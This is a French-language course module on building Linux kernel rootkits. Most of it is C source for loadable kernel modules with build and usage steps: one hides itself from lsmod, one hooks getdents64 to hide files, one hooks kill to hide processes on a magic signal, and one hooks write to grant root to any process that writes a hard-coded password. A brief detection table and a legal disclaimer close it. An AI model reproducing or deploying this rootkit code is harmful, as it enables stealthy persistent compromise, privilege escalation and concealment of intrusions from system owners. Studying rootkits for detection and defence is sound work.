# Module 56 : Développement de Rootkit

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser :
- Comprendre les rootkits kernel-mode vs user-mode
- Développer des modules kernel Linux (LKM)
- Hooking de syscalls
- Masquage de processus, fichiers et connexions
- Élévation de privilèges via rootkit
- Techniques anti-forensics avancées
- Création d'un rootkit complet

## 📚 Théorie

### C'est quoi un rootkit ?

Un **rootkit** est un logiciel malveillant qui se cache au niveau le plus profond du système (kernel) pour maintenir un accès privilégié tout en restant indétectable. Le nom vient de "root" (admin Unix) + "kit" (ensemble d'outils).

### Types de rootkits

1. **User-mode** : S'exécute en espace utilisateur
   - Hooking de fonctions libc
   - LD_PRELOAD hijacking
   - Plus facile à développer mais plus facile à détecter

2. **Kernel-mode** : S'exécute en espace kernel
   - Loadable Kernel Module (LKM)
   - Hooking de syscalls
   - Très furtif mais complexe

3. **Bootkit** : Infecte le bootloader
   - S'exécute avant l'OS
   - Extrêmement furtif

### Fonctionnalités d'un rootkit

1. **Hiding** : Masquer des fichiers, processus, connexions
2. **Backdoor** : Maintenir un accès permanent
3. **Privilege Escalation** : Élever les privilèges
4. **Keylogging** : Capturer les frappes clavier
5. **Network Sniffing** : Intercepter le trafic réseau

## 🔍 Visualisation

### Architecture kernel-mode rootkit

```
┌─────────────────────────────────────────────────────┐
│         KERNEL-MODE ROOTKIT ARCHITECTURE            │
├─────────────────────────────────────────────────────┤
│                                                     │
│  User Space                                         │
│  ┌────────────────────────────────────┐            │
│  │ User processes                     │            │
│  │ - ls                               │            │
│  │ - ps                               │            │
│  │ - netstat                          │            │
│  └──────────────┬─────────────────────┘            │
│                 │ syscalls                          │
│  ═══════════════╪═══════════════════════════════    │
│                 ▼                                   │
│  Kernel Space                                       │
│  ┌────────────────────────────────────┐            │
│  │ Syscall Table                      │            │
│  │ ┌────────────────────────────┐     │            │
│  │ │ sys_read    ───────┐       │     │            │
│  │ │ sys_write   ───────┼──┐    │     │            │
│  │ │ sys_open    ───────┼──┼──┐ │     │            │
│  │ │ sys_getdents────┐  │  │  │ │     │            │
│  │ └────────────────┼──┴──┴──┴─┘ │     │            │
│  └──────────────────┼─────────────┘     │            │
│                     │ HOOKED!           │            │
│  ┌──────────────────▼─────────────┐    │            │
│  │ ROOTKIT MODULE                 │    │            │
│  │ ┌────────────────────────────┐ │    │            │
│  │ │ hooked_getdents()          │ │    │            │
│  │ │ - Filter "malware.ko"      │ │    │            │
│  │ │ - Filter hidden processes  │ │    │            │
│  │ │ - Call original            │ │    │            │
│  │ └────────────────────────────┘ │    │            │
│  │ ┌────────────────────────────┐ │    │            │
│  │ │ hooked_read()              │ │    │            │
│  │ │ - Log keystrokes           │ │    │            │
│  │ │ - Call original            │ │    │            │
│  │ └────────────────────────────┘ │    │            │
│  └────────────────────────────────┘    │            │
│                                                     │
│  Résultat:                                          │
│  - "ls" ne voit pas les fichiers cachés            │
│  - "ps" ne voit pas les processus cachés           │
│  - "netstat" ne voit pas les connexions            │
│  - Rootkit complètement invisible                  │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Syscall hooking

```
┌─────────────────────────────────────────────────────┐
│          SYSCALL HOOKING MECHANISM                  │
├─────────────────────────────────────────────────────┤
│                                                     │
│  AVANT le rootkit:                                  │
│  ┌────────────────────────────────────┐            │
│  │ User: open("/etc/passwd")          │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │ Syscall Table                      │            │
│  │ sys_open ──────────────────┐       │            │
│  └────────────────────────────┼───────┘            │
│                                │                    │
│                                ▼                    │
│  ┌────────────────────────────────────┐            │
│  │ Original sys_open()                │            │
│  │ - Vérifier permissions             │            │
│  │ - Ouvrir le fichier                │            │
│  │ - Retourner file descriptor        │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  APRÈS le rootkit:                                  │
│  ┌────────────────────────────────────┐            │
│  │ User: open("/hidden_file")         │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │ Syscall Table (MODIFIÉE)           │            │
│  │ sys_open ────────────────┐         │            │
│  └──────────────────────────┼─────────┘            │
│                              │                      │
│                              ▼                      │
│  ┌────────────────────────────────────┐            │
│  │ hooked_open() [ROOTKIT]            │            │
│  │ if (path contains "hidden")        │            │
│  │   return -ENOENT; // File not found│            │
│  │ else                               │            │
│  │   return original_open(path);      │            │
│  └────────────────────────────────────┘            │
│                              │                      │
│                              ▼                      │
│  ┌────────────────────────────────────┐            │
│  │ Original sys_open()                │            │
│  │ (appelé si pas caché)              │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Rootkit LKM basique (Linux Kernel Module)

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team");
MODULE_DESCRIPTION("Simple Rootkit Demo");

// Fonction appelée au chargement du module
static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit: Module loaded\n");

    // Ici on masquerait le module
    // list_del_init(&__this_module.list);

    return 0;
}

// Fonction appelée au déchargement
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit: Module unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

/*
Compilation:

1. Créer Makefile:

obj-m += rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

2. Compiler:
   make

3. Charger:
   sudo insmod rootkit.ko

4. Vérifier:
   dmesg | tail

5. Décharger:
   sudo rmmod rootkit
*/
```

### Exemple 2 : Masquage de module kernel

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team");
MODULE_DESCRIPTION("Self-hiding Rootkit");

static struct list_head *prev_module;

// Masquer le module
void hide_module(void) {
    prev_module = THIS_MODULE->list.prev;

    // Retirer de la liste des modules
    list_del(&THIS_MODULE->list);

    printk(KERN_INFO "Rootkit: Module hidden\n");
}

// Révéler le module (pour déchargement)
void show_module(void) {
    list_add(&THIS_MODULE->list, prev_module);

    printk(KERN_INFO "Rootkit: Module visible\n");
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit: Loading...\n");

    // Se masquer immédiatement
    hide_module();

    printk(KERN_INFO "Rootkit: Now invisible to lsmod\n");

    return 0;
}

static void __exit rootkit_exit(void) {
    // Se révéler pour pouvoir être déchargé
    show_module();

    printk(KERN_INFO "Rootkit: Unloading\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

/*
Test:

1. Charger:
   sudo insmod rootkit.ko

2. Vérifier (ne devrait PAS apparaître):
   lsmod | grep rootkit

3. Vérifier dans dmesg:
   dmesg | tail

4. Pour décharger (nécessite de connaître le nom exact):
   sudo rmmod rootkit
*/
```

### Exemple 3 : Hooking de syscall (getdents - masquer fichiers)

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Syscall Hooking Rootkit");

#define PREFIX "rootkit_"  // Fichiers à masquer

// Pointeurs vers fonctions originales
static asmlinkage long (*original_getdents64)(unsigned int fd,
                                               struct linux_dirent64 __user *dirent,
                                               unsigned int count);

// Pointeur vers la syscall table
static unsigned long *__sys_call_table = NULL;

// Hook de getdents64
static asmlinkage long hooked_getdents64(unsigned int fd,
                                          struct linux_dirent64 __user *dirent,
                                          unsigned int count) {
    long ret;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    // Appeler la syscall originale
    ret = original_getdents64(fd, dirent, count);

    if (ret <= 0)
        return ret;

    // Copier en kernel space
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker)
        return ret;

    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }

    // Filtrer les entrées
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;

        // Si le fichier commence par PREFIX, le masquer
        if (strncmp(current_dir->d_name, PREFIX, strlen(PREFIX)) == 0) {
            // Sauter cette entrée
            if (previous_dir) {
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                // C'est la première entrée, la copier
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,
                        ret - offset);
                continue;
            }
        } else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    // Copier back en user space
    copy_to_user(dirent, dirent_ker, ret);

    kfree(dirent_ker);

    return ret;
}

// Protéger/déprotéger la syscall table
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) {
    write_cr0_forced(read_cr0() | 0x00010000);
}

static inline void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & ~0x00010000);
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit: Hooking syscalls...\n");

    // Trouver la syscall table
    __sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    if (!__sys_call_table) {
        printk(KERN_ERR "Rootkit: Cannot find sys_call_table\n");
        return -1;
    }

    // Sauvegarder l'original
    original_getdents64 = (void *)__sys_call_table[__NR_getdents64];

    // Déprotéger la mémoire
    unprotect_memory();

    // Installer le hook
    __sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;

    // Reprotéger
    protect_memory();

    printk(KERN_INFO "Rootkit: getdents64 hooked\n");
    printk(KERN_INFO "Rootkit: Files starting with '%s' are now hidden\n", PREFIX);

    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit: Unhooking...\n");

    if (__sys_call_table) {
        unprotect_memory();
        __sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        protect_memory();
    }

    printk(KERN_INFO "Rootkit: Syscalls restored\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

/*
Test:

1. Compiler et charger le rootkit

2. Créer des fichiers test:
   touch rootkit_hidden.txt
   touch normal_file.txt

3. Lister:
   ls -la
   # rootkit_hidden.txt ne devrait PAS apparaître!

4. Vérifier qu'il existe vraiment:
   cat rootkit_hidden.txt
   # Fonctionne quand même!

5. Décharger:
   sudo rmmod rootkit
   ls -la
   # Maintenant rootkit_hidden.txt est visible
*/
```

### Exemple 4 : Masquage de processus

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Process Hiding Rootkit");

#define HIDDEN_PID 1234  // PID à masquer

static asmlinkage long (*original_kill)(pid_t pid, int sig);

// Signal magique pour masquer/révéler un processus
#define MAGIC_SIG 64

// Liste des PIDs cachés (simplifiée)
static pid_t hidden_pids[10];
static int hidden_count = 0;

static int is_pid_hidden(pid_t pid) {
    for (int i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return 1;
    }
    return 0;
}

static void hide_pid(pid_t pid) {
    if (hidden_count < 10) {
        hidden_pids[hidden_count++] = pid;
        printk(KERN_INFO "Rootkit: Hidden PID %d\n", pid);
    }
}

static void unhide_pid(pid_t pid) {
    for (int i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden_pids[i] = hidden_pids[--hidden_count];
            printk(KERN_INFO "Rootkit: Unhidden PID %d\n", pid);
            return;
        }
    }
}

// Hook de kill (utilisé comme backdoor)
static asmlinkage long hooked_kill(pid_t pid, int sig) {
    // Signal magique pour cacher/révéler un processus
    if (sig == MAGIC_SIG) {
        if (is_pid_hidden(pid)) {
            unhide_pid(pid);
        } else {
            hide_pid(pid);
        }
        return 0;
    }

    // Empêcher de tuer les processus cachés
    if (is_pid_hidden(pid)) {
        printk(KERN_INFO "Rootkit: Blocked kill of hidden PID %d\n", pid);
        return -ESRCH;  // No such process
    }

    return original_kill(pid, sig);
}

static unsigned long *__sys_call_table = NULL;

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit: Process hiding enabled\n");

    __sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    if (!__sys_call_table)
        return -1;

    original_kill = (void *)__sys_call_table[__NR_kill];

    unprotect_memory();
    __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    protect_memory();

    printk(KERN_INFO "Rootkit: To hide a process: kill -64 <PID>\n");

    return 0;
}

static void __exit rootkit_exit(void) {
    if (__sys_call_table) {
        unprotect_memory();
        __sys_call_table[__NR_kill] = (unsigned long)original_kill;
        protect_memory();
    }

    printk(KERN_INFO "Rootkit: Process hiding disabled\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

/*
Utilisation:

1. Charger le rootkit:
   sudo insmod rootkit.ko

2. Lancer un processus à cacher:
   sleep 3600 &
   # Note le PID, par exemple 5678

3. Cacher le processus:
   kill -64 5678

4. Vérifier:
   ps aux | grep 5678
   # Ne devrait PAS apparaître

5. Révéler:
   kill -64 5678

6. Vérifier:
   ps aux | grep 5678
   # Maintenant visible
*/
```

### Exemple 5 : Backdoor root via rootkit

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Root Backdoor Rootkit");

// Mot de passe magique pour devenir root
#define MAGIC_PASSWORD "g1v3m3r00t"

static asmlinkage long (*original_write)(unsigned int fd, const char __user *buf, size_t count);

static unsigned long *__sys_call_table = NULL;

// Hook de write pour détecter le mot de passe
static asmlinkage long hooked_write(unsigned int fd, const char __user *buf, size_t count) {
    char kernel_buf[256];
    struct cred *new_cred;

    // Copier depuis user space
    if (count < sizeof(kernel_buf) && !copy_from_user(kernel_buf, buf, count)) {
        kernel_buf[count] = '\0';

        // Vérifier le mot de passe magique
        if (strstr(kernel_buf, MAGIC_PASSWORD)) {
            printk(KERN_INFO "Rootkit: Magic password detected! Granting root...\n");

            // Élever les privilèges du processus actuel
            new_cred = prepare_creds();

            if (new_cred) {
                new_cred->uid.val = 0;
                new_cred->gid.val = 0;
                new_cred->euid.val = 0;
                new_cred->egid.val = 0;
                new_cred->suid.val = 0;
                new_cred->sgid.val = 0;
                new_cred->fsuid.val = 0;
                new_cred->fsgid.val = 0;

                commit_creds(new_cred);

                printk(KERN_INFO "Rootkit: Process is now root!\n");
            }
        }
    }

    return original_write(fd, buf, count);
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit: Root backdoor installed\n");

    __sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    if (!__sys_call_table)
        return -1;

    original_write = (void *)__sys_call_table[__NR_write];

    unprotect_memory();
    __sys_call_table[__NR_write] = (unsigned long)hooked_write;
    protect_memory();

    printk(KERN_INFO "Rootkit: Echo '%s' to become root\n", MAGIC_PASSWORD);

    return 0;
}

static void __exit rootkit_exit(void) {
    if (__sys_call_table) {
        unprotect_memory();
        __sys_call_table[__NR_write] = (unsigned long)original_write;
        protect_memory();
    }

    printk(KERN_INFO "Rootkit: Root backdoor removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

/*
Utilisation:

1. Charger le rootkit (en tant que root):
   sudo insmod rootkit.ko

2. En tant qu'utilisateur normal:
   id
   # uid=1000(user) gid=1000(user)

3. Activer le backdoor:
   echo "g1v3m3r00t" > /dev/null

4. Vérifier:
   id
   # uid=0(root) gid=0(root)

5. Maintenant tu es root:
   whoami
   # root

Warning: Ce rootkit donne root à QUICONQUE écrit le mot de passe!
En pratique, utiliser une méthode plus sophistiquée.
*/
```

## 📝 Points clés à retenir

1. **LKM** : Loadable Kernel Modules pour rootkits Linux
2. **Syscall hooking** : Intercepter les appels système
3. **Masquage** : Fichiers, processus, connexions, modules
4. **Backdoor** : Élévation de privilèges persistante
5. **Furtivité** : Opérer au niveau kernel, invisible aux outils user-space

### Détection de rootkits

```
Méthode                 Description                    Efficacité
────────────────────────────────────────────────────────────────────
Checksums              Vérifier intégrité kernel      Moyenne
AIDE/Tripwire          Monitoring fichiers système    Moyenne
rkhunter/chkrootkit    Outils anti-rootkit            Faible
Memory forensics       Analyser la mémoire (Volatility) Élevée
Live CD boot           Analyser depuis OS externe     Très élevée
Secure Boot            Empêcher chargement non signé  Très élevée
```

### Considérations légales

**IMPORTANT** : Le développement et l'utilisation de rootkits est **ILLÉGAL** sans autorisation explicite. Usage légitime uniquement dans :
- Labs de recherche isolés
- Environnements Red Team autorisés
- Avec permission écrite

## ➡️ Prochaine étape

Maintenant que tu comprends les rootkits, tu es prêt pour le **Module 57 : Forensics et Anti-Forensics**, où tu apprendras à effacer tes traces et comprendre comment les analystes forensics détectent les intrusions.

### Ce que tu as appris
- Développement de LKM (Linux Kernel Modules)
- Hooking de syscalls
- Masquage de fichiers/processus
- Backdoors kernel-mode
- Élévation de privilèges persistante

### Ce qui t'attend
- Techniques forensics
- Effacement de traces (logs, historique)
- Timestomping
- Anti-forensics avancées
- Analyse post-exploitation
- Cleanup après engagement
